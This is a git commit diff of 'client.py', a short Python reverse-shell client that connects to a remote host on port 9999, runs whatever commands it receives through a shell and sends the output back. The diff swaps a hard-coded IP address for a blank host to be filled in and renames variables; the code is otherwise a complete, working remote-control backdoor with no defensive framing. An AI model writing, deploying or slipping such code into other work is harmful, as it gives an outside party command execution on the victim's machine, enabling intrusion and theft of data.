fd7e758ed1bb82fac0368848298715650b11b442
rhythm-mahajan <101541466+rhythm-mahajan@users.noreply.github.com>
2022-03-14 00:30:24 -0600

    Update client.py

--- client.py
+++ client.py
@@ -2,22 +2,23 @@ import socket
 import os
 import subprocess
 
-s = socket.socket()
-host = '138.68.68.65'
+soc = socket.socket()
+host = '' #enter the host ip address
 port = 9999
 
-s.connect((host, port))
+soc.connect((host, port))
 
 while True:
-    data = s.recv(1024)
+    data = soc.recv(1024)
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
 
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                               stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
+        output_str = str(output_byte, "utf-8")
         currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+        soc.send(str.encode(output_str + currentWD))
 
         print(output_str)
